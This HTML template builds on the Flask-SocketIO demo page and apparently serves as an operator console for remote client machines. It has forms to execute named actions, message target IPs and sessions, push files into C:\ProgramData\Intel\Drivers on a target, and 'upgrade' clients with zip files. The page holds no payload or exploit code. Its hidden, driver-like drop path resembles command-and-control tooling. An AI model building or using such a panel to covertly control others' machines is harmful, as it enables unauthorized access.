<!DOCTYPE HTML>
<html>
<head>
    <title>Flask-SocketIO Test</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/3.0.4/socket.io.js" integrity="sha512-aMGMvNYu8Ue4G+fHa359jcPb1u+ytAF+P2SCb+PxrjCdO3n3ZTxJ30zuH39rimUggmTwmh2u7wvQsDTHESnmfQ==" crossorigin="anonymous"></script>
    <script type="text/javascript" charset="utf-8">
        $(document).ready(function() {
            // Connect to the Socket.IO server.
            // The connection URL has the following format, relative to the current page:
            //     http[s]://<domain>:<port>[/<namespace>]
            var socket = io();

            // Event handler for new connections.
            // The callback function is invoked when a connection with the
            // server is established.
            socket.on('connect', function() {
                socket.emit('my_event', {data: 'I\'m connected!'});
            });

            // Event handler for server sent data.
            // The callback function is invoked whenever the server emits data
            // to the client. The data is then displayed in the "Received"
            // section of the page.
            socket.on('my_response', function(msg, cb) {
                console.log(msg);
                $('#log').append('<br>' + $('<div/>').text('Received #' + msg.count + ': ' + msg.data).html());
                if (cb)
                    cb();
            });

            // Interval function that tests message latency by sending a "ping"
            // message. The server then responds with a "pong" message and the
            // round trip time is measured.
            var ping_pong_times = [];
            var start_time;
            window.setInterval(function() {
                start_time = (new Date).getTime();
                $('#transport').text(socket.io.engine.transport.name);
                socket.emit('my_ping');
            }, 1000);

            // Handler for the "pong" message. When the pong is received, the
            // time from the ping is stored, and the average of the last 30
            // samples is average and displayed.
            socket.on('my_pong', function() {
                var latency = (new Date).getTime() - start_time;
                ping_pong_times.push(latency);
                ping_pong_times = ping_pong_times.slice(-30); // keep last 30 samples
                var sum = 0;
                for (var i = 0; i < ping_pong_times.length; i++)
                    sum += ping_pong_times[i];
                $('#ping-pong').text(Math.round(10 * sum / ping_pong_times.length) / 10);
            });


            $('form#execute').submit(function(event) {
                console.log(event);
                socket.emit($('#emit_action').val(), {data: $('#emit_data').val()});
                return false;
            });

            $('#my_info').click(function(event) {
                socket.emit('my_info');
                return false;
            });

            // Handlers for the different forms in the page.
            // These accept data from the user and send it to the server in a
            // variety of ways
            $('form#emit').submit(function(event) {
                socket.emit('my_event', {data: $('#emit_data').val()});
                return false;
            });
            $('form#broadcast').submit(function(event) {
                socket.emit('my_broadcast_event', {data: $('#broadcast_data').val()});
                return false;
            });
            $('form#join').submit(function(event) {
                socket.emit('join', {room: $('#join_room').val()});
                return false;
            });
            $('form#leave').submit(function(event) {
                socket.emit('leave', {room: $('#leave_room').val()});
                return false;
            });
            $('form#send_room').submit(function(event) {
                socket.emit('my_room_event', {room: $('#room_name').val(), data: $('#room_data').val()});
                return false;
            });

            $('form#send_event').submit(function(event) {
                socket.emit($('#event_name').val(), {data: $('#event_data').val()});
                return false;
            });

            
            $('form#send_to_ip').submit(function(event) {
                socket.emit('send_to_ip', {data: $('#send_to_ip_data').val(), ip:$('#send_to_target_ip').val() });
                return false;
            });

            $('form#send_to_session').submit(function(event) {
                socket.emit('send_to_session', {data: $('#send_to_session_data').val(), session:$('#send_to_target_session').val() });
                return false;
            });

            $('form#close').submit(function(event) {
                socket.emit('close_room', {room: $('#close_room').val()});
                return false;
            });
            $('form#disconnect').submit(function(event) {
                socket.emit('disconnect_request');
                return false;
            });

            $('#submit_upload').click(function(event) {
                var file = $('#upload_data')[0].files[0];
                console.log(file);
                var payload = {data:file, dist_ip: $('#upload_ip').val(), name: file.name, path: 'C:\\ProgramData\\Intel\\Drivers', action: $('#upload_action').val()};
                socket.emit("upload", payload, (status) => {
                    console.log(status);
                });
                return false;
            });

            $('#submit_upgrade').click(function(event) {
                var file = $('#upgrade_data')[0].files[0];
                console.log(file);
                var payload = {data:file, dist_ip: $('#upgrade_ip').val(), name: file.name, type: file.type};
                socket.emit("upgrade", payload, (status) => {
                    console.log(status);
                });
                return false;
            });

            $(window).bind('beforeunload', function(){
                socket.emit('disconnect_request');
                return 'wait';
            });

        });


        

    </script>
</head>
<body>
    <h1>Flask-SocketIO Test</h1>
    <p>
      Async mode is: <b>{{ async_mode }}</b><br>
      Current transport is: <b><span id="transport"></span></b><br>
      Average ping/pong latency: <b><span id="ping-pong"></span>ms</b>
    </p>
    <h2>Send:</h2>
    <form id="execute" method="POST" action='#'>
        <input type="text" name="emit_action" id="emit_action" placeholder="Action">
        <input type="text" name="emit_data" id="emit_data" placeholder="Data">
        <input type="submit" value="Execute">
    </form>
    <input type="button" id="my_info" value="My Info">
    <form id="emit" method="POST" action='#'>
        <input type="text" name="emit_data" id="emit_data" placeholder="Message">
        <input type="submit" value="Echo">
    </form>
    <form id="broadcast" method="POST" action='#'>
        <input type="text" name="broadcast_data" id="broadcast_data" placeholder="Message">
        <input type="submit" value="Broadcast">
    </form>
    <form id="join" method="POST" action='#'>
        <input type="text" name="join_room" id="join_room" placeholder="Room Name">
        <input type="submit" value="Join Room">
    </form>
    <form id="leave" method="POST" action='#'>
        <input type="text" name="leave_room" id="leave_room" placeholder="Room Name">
        <input type="submit" value="Leave Room">
    </form>
    <form id="send_room" method="POST" action='#'>
        <input type="text" name="room_name" id="room_name" placeholder="Room Name">
        <input type="text" name="room_data" id="room_data" placeholder="Message">
        <input type="submit" value="Send to Room">
    </form>

    <form id="send_event" method="POST" action='#'>
        <input type="text" name="event_name" id="event_name" placeholder="Event Name">
        <input type="text" name="event_data" id="event_data" placeholder="Message">
        <input type="submit" value="Send to Event">
    </form>

    <form id="send_to_ip" method="POST" action='#'>
        <input type="text" name="send_to_target_ip" id="send_to_target_ip" placeholder="Target Ip">
        <input type="text" name="send_to_ip_data" id="send_to_ip_data" placeholder="Message">
        <input type="submit" value="Send to Ip">
    </form>

    <form id="send_to_session" method="POST" action='#'>
        <input type="text" name="send_to_target_session" id="send_to_target_session" placeholder="Target Session">
        <input type="text" name="send_to_session_data" id="send_to_session_data" placeholder="Message">
        <input type="submit" value="Send to Session">
    </form>

    <form id="close" method="POST" action="#">
        <input type="text" name="close_room" id="close_room" placeholder="Room Name">
        <input type="submit" value="Close Room">
    </form>

    <form id="upload" method="POST" action="#">
        <input type="file" id="upload_data" />
        <input type="text" name="upload_ip" id="upload_ip" placeholder="Target Ip">
        <input type="text" name="upload_action" id="upload_action" placeholder="Action" value="upload">
        <input type="button" id="submit_upload" value="Upload File">
    </form>

    <form id="upgrade" method="POST" action="#">
        <input type="file" id="upgrade_data" accept=".zip*" />
        <input type="text" name="upgrade_ip" id="upgrade_ip" placeholder="Target Ip">
        <input type="button" id="submit_upgrade" value="Upgrade Client">
    </form>

    <form id="disconnect" method="POST" action="#">
        <input type="submit" value="Disconnect">
    </form>
    <h2>Receive:</h2>
    <div id="log"></div>
</body>
</html>
